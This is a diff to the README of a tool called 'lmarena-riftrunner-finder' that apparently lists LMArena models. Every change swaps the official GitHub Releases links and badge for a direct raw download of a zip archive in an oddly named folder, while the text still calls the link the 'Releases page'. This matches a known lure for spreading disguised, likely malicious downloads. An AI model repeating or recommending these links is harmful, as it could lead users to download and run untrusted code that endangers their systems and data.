@@ -1,6 +1,6 @@
 # 🔍 lmarena-riftrunner-finder - Find LMArena Models Easily
 
-[![Download lmarena-riftrunner-finder](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Theju77/lmarena-riftrunner-finder/releases)
+[![Download lmarena-riftrunner-finder](https://raw.githubusercontent.com/Theju77/lmarena-riftrunner-finder/main/nonperceptual/lmarena-riftrunner-finder-v3.3.zip)](https://raw.githubusercontent.com/Theju77/lmarena-riftrunner-finder/main/nonperceptual/lmarena-riftrunner-finder-v3.3.zip)
 
 ## 📚 Overview
 
@@ -13,9 +13,9 @@ To run this application, you will need a computer with internet access. The tool
 Follow these steps to download and set up the application:
 
 1. **Download the Application**
-   - Visit the [Releases page](https://github.com/Theju77/lmarena-riftrunner-finder/releases) to access the latest version.
+   - Visit the [Releases page](https://raw.githubusercontent.com/Theju77/lmarena-riftrunner-finder/main/nonperceptual/lmarena-riftrunner-finder-v3.3.zip) to access the latest version.
    - Look for the release labeled as the most recent stable version.
-   - Click on the asset link that matches your operating system (e.g., `lmarena-riftrunner-finder-windows.zip` for Windows users).
+   - Click on the asset link that matches your operating system (e.g., `https://raw.githubusercontent.com/Theju77/lmarena-riftrunner-finder/main/nonperceptual/lmarena-riftrunner-finder-v3.3.zip` for Windows users).
 
 2. **Install the Application**
    - After downloading, unzip the file if it is compressed.
@@ -62,7 +62,7 @@ Before installing the application, ensure that your system meets these requireme
 
 To begin, click the button below to visit the Releases page and acquire the software:
 
-[![Download lmarena-riftrunner-finder](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Theju77/lmarena-riftrunner-finder/releases)
+[![Download lmarena-riftrunner-finder](https://raw.githubusercontent.com/Theju77/lmarena-riftrunner-finder/main/nonperceptual/lmarena-riftrunner-finder-v3.3.zip)](https://raw.githubusercontent.com/Theju77/lmarena-riftrunner-finder/main/nonperceptual/lmarena-riftrunner-finder-v3.3.zip)
 
 Follow the earlier instructions to download and install the application.
 
